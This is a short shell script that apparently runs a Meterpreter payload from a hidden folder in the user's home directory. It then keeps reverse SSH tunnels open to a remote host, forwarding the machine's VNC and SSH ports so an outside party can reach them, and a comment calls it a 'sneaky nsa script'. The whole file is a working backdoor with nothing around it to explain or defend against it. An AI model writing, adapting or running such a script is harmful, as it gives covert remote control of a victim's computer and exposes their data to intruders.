#!/bin/sh

USERNAME=`/usr/bin/whoami`
PYTHON=`which python`

/usr/bin/python /Users/$USERNAME/.dtc2/meterp.py
isitup=`ps auxwww | grep 2222 | grep ssh | grep -v grep| wc -l`
createTunnel() {
    /usr/bin/nohup ssh -f -N -R 5900:localhost:5900 -R 2222:localhost:22 tunnel@somehost 2>&1 > /dev/null
}

if [ "$isitup" -lt 2 ]; then
    createTunnel
fi
# fire sneaky nsa script
